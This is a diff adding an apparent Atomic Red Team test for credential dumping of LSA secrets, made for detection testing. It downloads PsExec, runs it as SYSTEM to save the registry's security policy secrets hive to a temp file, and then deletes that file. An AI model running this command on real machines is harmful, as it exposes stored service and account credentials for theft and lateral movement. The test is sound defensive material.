@@ -1,0 +1,18 @@
+#TechniqueName: OS Credential Dumping: LSA Secrets
+#AtomicTestName: Dumping LSA Secrets
+#Language: cmd
+
+#get_prereq_commands
+Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "$env:TEMP\PSTools.zip"
+Expand-Archive $env:TEMP\PSTools.zip $env:TEMP\PSTools -Force
+New-Item -ItemType Directory (Split-Path PathToAtomicsFolder\T1003.004\bin\PsExec.exe) -Force | Out-Null
+Copy-Item $env:TEMP\PSTools\PsExec.exe PathToAtomicsFolder\T1003.004\bin\PsExec.exe -Force
+
+#prereq_commands
+if (Test-Path PathToAtomicsFolder\T1003.004\bin\PsExec.exe) {exit 0} else {exit 1}
+
+#commands
+PathToAtomicsFolder\T1003.004\bin\PsExec.exe -accepteula -s reg save HKLM\security\policy\secrets %temp%\secrets
+
+#cleanup_commands
+del %temp%\secrets >nul 2> nul
